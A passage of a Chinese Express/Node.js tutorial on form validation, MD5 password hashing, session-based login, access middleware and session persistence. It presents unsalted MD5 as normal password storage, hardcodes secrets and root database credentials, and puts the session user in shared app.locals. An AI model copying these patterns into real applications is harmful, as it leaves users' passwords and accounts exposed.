tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jquery.validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- jquery-validation 默认的提示消息是英文，引入该文件让其显式中文 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>messages_zh.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>配置验证规则</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">minlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">maxlength</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>18<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>注册验证</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 该方法会自动监听表单的提交行为</span><span class="token comment" spellcheck="true">// 当你提交表单的时候，它就根据你在表单控件中设置的验证规则，进行验证</span><span class="token comment" spellcheck="true">// 如果验证失败，就在界面上给出提示</span><span class="token comment" spellcheck="true">// 如果验证通过，则调用 submitHandler 方法，所以我们可以把请求服务端提交数据的代码写到 submitHandler 中</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'##form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  submitHandler<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>form<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// form 就是验证的表单 DOM 对象</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'验证通过'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>除了将验证规则写到标签上，页可以将验证规则写到 JavaScript 中（推荐，js更灵活）</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"##signupForm"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  rules<span class="token punctuation">:</span> <span class="token punctuation">{</span>    firstname<span class="token punctuation">:</span> <span class="token string">"required"</span><span class="token punctuation">,</span>    lastname<span class="token punctuation">:</span> <span class="token string">"required"</span><span class="token punctuation">,</span>    username<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">5</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    confirm_password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>      equalTo<span class="token punctuation">:</span> <span class="token string">"##password"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    email<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      email<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topic<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token string">"##newsletter:checked"</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    agree<span class="token punctuation">:</span> <span class="token string">"required"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>如果想自定义错误提示消息，则可以通过 <code>messages</code> 选项自定义</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"##signupForm"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  rules<span class="token punctuation">:</span> <span class="token punctuation">{</span>    firstname<span class="token punctuation">:</span> <span class="token string">"required"</span><span class="token punctuation">,</span>    lastname<span class="token punctuation">:</span> <span class="token string">"required"</span><span class="token punctuation">,</span>    username<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">5</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    confirm_password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>      equalTo<span class="token punctuation">:</span> <span class="token string">"##password"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    email<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      email<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    topic<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token string">"##newsletter:checked"</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token number">2</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    agree<span class="token punctuation">:</span> <span class="token string">"required"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  messages<span class="token punctuation">:</span> <span class="token punctuation">{</span>    firstname<span class="token punctuation">:</span> <span class="token string">"请输入您的名字"</span><span class="token punctuation">,</span>    lastname<span class="token punctuation">:</span> <span class="token string">"请输入您的姓氏"</span><span class="token punctuation">,</span>    username<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token string">"请输入用户名"</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token string">"用户名必需由两个字母组成"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token string">"请输入密码"</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token string">"密码长度不能小于 5 个字母"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    confirm_password<span class="token punctuation">:</span> <span class="token punctuation">{</span>      required<span class="token punctuation">:</span> <span class="token string">"请输入密码"</span><span class="token punctuation">,</span>      minlength<span class="token punctuation">:</span> <span class="token string">"密码长度不能小于 5 个字母"</span><span class="token punctuation">,</span>      equalTo<span class="token punctuation">:</span> <span class="token string">"两次密码输入不一致"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    email<span class="token punctuation">:</span> <span class="token string">"请输入一个正确的邮箱"</span><span class="token punctuation">,</span>    agree<span class="token punctuation">:</span> <span class="token string">"请接受我们的声明"</span><span class="token punctuation">,</span>    topic<span class="token punctuation">:</span> <span class="token string">"请选择两个主题"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>自定义错误提示文本样式</p><pre class=" language-css"><code class="language-css"><span class="token selector">form label<span class="token class">.error</span> </span><span class="token punctuation">{</span>    <span class="token property">color</span><span class="token punctuation">:</span> red <span class="token important">!important</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">form input<span class="token class">.error</span> </span><span class="token punctuation">{</span>  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid red <span class="token important">!important</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">form input<span class="token class">.valid</span> </span><span class="token punctuation">{</span>  <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid green <span class="token important">!important</span><span class="token punctuation">;</span>  <span class="token property">box-shadow</span><span class="token punctuation">:</span> inset <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">1</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">.075</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>异步验证（只是提高用户体验，减小服务器压力）</p><ul><li>remote<ul><li>指定一个接口地址，它会自动发请求</li><li>要求接口返回 true 或者 false</li><li>true 验证通过</li><li>false 验证失败</li></ul></li><li>接口<ul><li>返回 true 或者 false</li></ul></li></ul><h6 id="删除用户（作业）"><a href="#删除用户（作业）" class="headerlink" title="删除用户（作业）"></a>删除用户（作业）</h6><h6 id="编辑用户（作业）"><a href="#编辑用户（作业）" class="headerlink" title="编辑用户（作业）"></a>编辑用户（作业）</h6><h6 id="密码加密问题"><a href="#密码加密问题" class="headerlink" title="密码加密问题"></a>密码加密问题</h6><p>哈希散列算法Hash<br>是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出<br>输出就是散列值<br>不可能从散列值来确定唯一的输入值，说白了就是不能解密</p><p>哈希特点：</p><ul><li>只能加，不能解</li><li>相同的字符串得到的加密结果永远是一样的</li><li>用户登录<ul><li>把用户输入的明文加密然后和数据库存储的密码进行比对</li></ul></li></ul><p>常用 hash  算法</p><ul><li>md4</li><li>md5</li><li>sha1</li><li>…</li></ul><p>e10adc3949ba59abbe56e057f20f883e</p><p>Hash 破解问题,暴力破解，穷举尝试<br>1 dsajbfdjbsafsa<br>2 bdsabdkjsab<br>3 bdsjab kjdsa<br>4 djsabdsa<br>12 djsabdjsa<br>123 djsabjdbsa<br>123456 e10adc3949ba59abbe56e057f20f883e<br>1@23465 e10adc3949ba59abbe56e057f20f88ddsa<br>1@23465 ysyhljt</p><h4 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h4><ul><li><p>基本登录流程处理</p><ul><li>校验用户名是否存在</li><li>校验密码是否正确</li></ul></li><li><p>记录用户登录状态</p></li><li><p>基本的页面访问权限认真，如果用户没有登录，则让用户跳转到登录页面进行登录</p><p><img src="http://assets.processon.com/chart_image/5c419e62e4b056ae29f51eab.png" alt="用户登录处理流程"></p></li></ul><h4 id="找回密码（-）"><a href="#找回密码（-）" class="headerlink" title="找回密码（*）"></a>找回密码（*）</h4><ul><li><a href="http://www.ruanyifeng.com/blog/2019/02/password.html" target="_blank" rel="noopener">找回密码的功能设计</a></li></ul><h4 id="状态保持"><a href="#状态保持" class="headerlink" title="状态保持"></a>状态保持</h4><h6 id="Cookie-和-Session"><a href="#Cookie-和-Session" class="headerlink" title="Cookie 和 Session"></a>Cookie 和 Session</h6><ul><li>HTTP 协议本身是无状态的</li><li>Cookie 发橘子，往背后贴纸条<ul><li>纸条就是Cookie</li><li>Cookie 是存储在客户端</li><li>不适合存储涉及安全敏感数据</li><li>有大小限制，2kb</li></ul></li><li>Session 超市存物柜，东西放到柜子里，你拿着小票<ul><li>超市服务器，你就是客户端</li><li>你去超市购物，就是会话的一个过程</li><li>存物柜在超市，也就是说 Session 是把数据存储在服务器</li><li>超市签发生成一个小票给你，以 Cookie 的方式保存在客户端</li><li>小票由服务端签发生成，每个小票都不一样，所以客户端无法轻易伪造</li><li>Session 是基于 Cookie 实现的</li><li>Cookie 中存储访问 Session 数据的凭证</li><li>每个人的 Cookie 凭证都不一样</li><li>由于凭证是服务器签发生成的，所以客户端无法轻易伪造</li></ul></li></ul><h6 id="使用-Session-存储登录状态"><a href="#使用-Session-存储登录状态" class="headerlink" title="使用 Session 存储登录状态"></a>使用 Session 存储登录状态</h6><blockquote><p>参考文档：<a href="https://github.com/expressjs/session" target="_blank" rel="noopener">https://github.com/expressjs/session</a></p></blockquote><ol><li>安装</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i express-session</code></pre><ol start="2"><li>配置</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 生成密文是有一套算法的来计算生成密文，如果网站都使用默认的密文生成方式， 就会有一定的重复和被破解的概率，所以为了增加这个安全性，算法对外暴露了一个混入私钥的接口，算法在生成密文的时候会混入我们添加的自定义成分</span>  secret<span class="token punctuation">:</span> <span class="token string">'itcast'</span><span class="token punctuation">,</span>  resave<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 如果为 true 无论是否往 Session 中存储数据，都直接给客户端发送一个 Cookie 小票</span>  <span class="token comment" spellcheck="true">// 如果为 false，则只有在往 Session 中写入数据的时候才会下发小票</span>  <span class="token comment" spellcheck="true">// 推荐设置为 true</span>  saveUninitialized<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre><ol start="3"><li>使用</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 存储 Session 数据</span><span class="token comment" spellcheck="true">// 就想操作对象一样，往 Session 中写数据</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>名字 <span class="token operator">=</span> 值<span class="token comment" spellcheck="true">// 读取 Session 中的数据</span><span class="token comment" spellcheck="true">// 就是读取对象成员一样，读取 Session 中的数据</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>名字</code></pre><ol start="4"><li>这里我们需要在用户登录成功以后记录用户的登录状态</li></ol><pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/users/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token operator">...</span>  <span class="token operator">...</span>  <span class="token operator">...</span>  <span class="token comment" spellcheck="true">// 将用户登录状态记录到 Session 中</span>  <span class="token comment" spellcheck="true">// user 就是我们从数据库中查询到的用户数据对象</span>  req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> user  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    success<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    message<span class="token punctuation">:</span> <span class="token string">'登录成功'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="页面访问权限控制"><a href="#页面访问权限控制" class="headerlink" title="页面访问权限控制"></a>页面访问权限控制</h6><p>简单一点，直接在处理页面渲染的路由中进行判定，如果没有登录，则让其跳转到登录页，否则，正常渲染页面</p><pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> sessionUser <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sessionUser<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/admin/login'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>如果在每一个需要验证的页面访问路由中都做上面那样的判定就会很麻烦，所以我们可以利用中间件的方式来统一处理页面的登录状态校验</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * 统一控制后台管理系统的页面访问权限 * 相当于为所有以 /admin/xxxxx 开头的请求设置了一道关卡 *  */</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 如果是登录页面 /admin/login，允许通过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>originalUrl <span class="token operator">===</span> <span class="token string">'/admin/login'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 这里 next() 就会往后匹配调用到我们的那个能处理 /admin/login 的路由</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 2. 其他页面都一律验证登录状态</span>  <span class="token keyword">const</span> sessionUser <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user  <span class="token comment" spellcheck="true">//    如果没有登录页， 让其重定向到登录页</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sessionUser<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/admin/login'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 如果登录了，则允许通过</span>  <span class="token comment" spellcheck="true">// 这里调用 next 就是调用与当前请求匹配的下一个中间件路由函数</span>  <span class="token comment" spellcheck="true">// 例如，当前请求是 /admin/users ，则 next 会找到我们那个匹配 /admin/users 的路由去处理</span>  <span class="token comment" spellcheck="true">//                  /admin/categories ，则 next 会找到我们添加的那个 /admin/categories 的路由去处理</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>为了好维护，建议将这种中间件处理封装到独立的模块中，这里我们把这个处理过程封装到了 <code>middlewares/check-login.js</code> 文件模块中</p><pre class=" language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 所有以 /admin/ 开头的请求都会进入这个中间件</span>  <span class="token comment" spellcheck="true">// 1. 如果是 /admin/login 则直接允许通过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>originalUrl <span class="token operator">===</span> <span class="token string">'/admin/login'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 2. 非 /admin/login 的页面都校验登录状态</span>  <span class="token keyword">const</span> sessionUser <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user  <span class="token comment" spellcheck="true">// 2.1 如果没有则让其去登录</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sessionUser<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/admin/login'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// 2.2 如果登录了则让其通过</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>然后在 <code>app.js</code> 中挂载这个中间件</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> checkLogin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./middlewares/check-login.js'</span><span class="token punctuation">)</span><span class="token operator">...</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> checkLogin<span class="token punctuation">)</span><span class="token operator">...</span></code></pre><h6 id="用户退出"><a href="#用户退出" class="headerlink" title="用户退出"></a>用户退出</h6><p>首先实现用户退出数据接口</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/** * 用户退出 */</span>router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/admin/users/logout'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 1. 清除登录状态</span>  <span class="token keyword">delete</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user  <span class="token comment" spellcheck="true">// 2. 记录用户的退出时间</span>  <span class="token comment" spellcheck="true">// 2. 跳转到登录页</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/admin/login'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>然后将顶部的退出按钮的链接指向数据接口</p><pre class=" language-html"><code class="language-html">...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/admin/users/logout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fa fa-sign-out<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>退出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>...</code></pre><p><code>delete</code> 是 JavaScript 的一个关键字，用来删除对象成员的</p><p><img src="/images/1551859111822.png" alt="1551859111822"></p><h6 id="Session-数据持久化"><a href="#Session-数据持久化" class="headerlink" title="Session 数据持久化"></a>Session 数据持久化</h6><blockquote><p>参考文档：<a href="https://github.com/chill117/express-mysql-session" target="_blank" rel="noopener">https://github.com/chill117/express-mysql-session</a></p></blockquote><p>Session 数据持久化的目的是为了解决服务器重启或者崩溃挂掉导致的 Session 数据丢失的问题。</p><p>因为默认情况下 Session 数据是存储在内存中的，服务器一旦重启就会导致 Session 数据丢失。</p><p>所了我们为了解决这个问题，把 Session 数据存储到了数据库中。</p><ol><li>安装</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i express-mysql-session</code></pre><ol start="2"><li>配置</li></ol><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">...</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/** * 配置 Session 数据持久化 * 参考文档：https://github.com/chill117/express-mysql-session##readme * 该插件会自动往数据库中创建一个 sessions 表，用来存储 Session 数据 */</span><span class="token keyword">const</span> MySQLStore <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-mysql-session'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token keyword">const</span> sessionStore <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MySQLStore</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  host<span class="token punctuation">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span>  port<span class="token punctuation">:</span> <span class="token number">3306</span><span class="token punctuation">,</span>  user<span class="token punctuation">:</span> <span class="token string">'root'</span><span class="token punctuation">,</span>  password<span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span>  database<span class="token punctuation">:</span> <span class="token string">'alishow62'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  secret<span class="token punctuation">:</span> <span class="token string">'keyboard cat'</span><span class="token punctuation">,</span>  resave<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  saveUninitialized<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  store<span class="token punctuation">:</span> sessionStore<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 告诉 express-session 中间件，使用 sessionStore 持久化 Session 数据</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre><h6 id="展示当前登录用户信息"><a href="#展示当前登录用户信息" class="headerlink" title="展示当前登录用户信息"></a>展示当前登录用户信息</h6><blockquote><p>参考文档：<a href="http://expressjs.com/en/4x/api.html##app.locals" target="_blank" rel="noopener">http://expressjs.com/en/4x/api.html##app.locals</a></p></blockquote><p>简单点就是在每一次 render 页面的时候，把 <code>req.session.user</code> 传到模板中去使用。</p><p>当你需要在多个模板中使用相同的模板数据的时候，每一次 render 传递就麻烦了。所以 express  提供了一种简单的方式，我们可以把模板中公用的数据放到 <code>app.locals</code> 中。<code>app.locals</code> 中的数据可以在模板中直接使用。</p><pre class=" language-javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> checkLogin<span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 只有在 checkLogin 中 next 了，才会执行这个中间件</span>  app<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>sessionUser <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="记住我（-）"><a href="#记住我（-）" class="headerlink" title="记住我（*）"></a>记住我（*）</h6><p><img src="http://assets.processon.com/chart_image/5c419ffce4b048f108d5ce97.png" alt="记住我处理流程"></p><p>对称加解密：加解密使用的私钥必须一致。</p><p>加密：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cipher <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createCipher</span><span 